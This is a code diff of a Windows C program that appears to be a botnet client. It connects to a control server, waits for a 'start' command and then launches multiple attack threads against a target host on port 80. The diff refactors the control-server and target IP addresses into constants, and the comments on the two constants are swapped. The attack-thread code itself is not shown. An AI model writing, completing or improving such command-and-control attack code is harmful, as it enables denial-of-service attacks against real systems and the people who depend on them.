@@ -7,6 +7,9 @@
 #include <winuser.h>
 #include "utils.h"
 
+#define TARGET_IP ""        // control server IP here
+#define SERVER_IP ""        // target IP here
+
 volatile int running = 0;
 HANDLE attack_threads [NUM_THREADS];
 
@@ -21,7 +24,12 @@ int main() {
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8080);
-    const char* server_ip = "";
+    const char* server_ip = SERVER_IP;
+
+    // target socket details and setup
+    struct address target_addr;
+    target_addr.ip = TARGET_IP;
+    target_addr.port = 80;
 
     startWinsock(&wsaData);
     server_socket = startSocket();
@@ -33,9 +41,6 @@ int main() {
         receiveCommand(server_socket, cmd_buff);
 
         if (strcmp(cmd_buff, "start") == 0){
-            struct address target_addr;
-            target_addr.ip = "";
-            target_addr.port = 80;
             printf("Executing attack...\n");
             running = 1;
             for (int i=0; i<NUM_THREADS; i++){
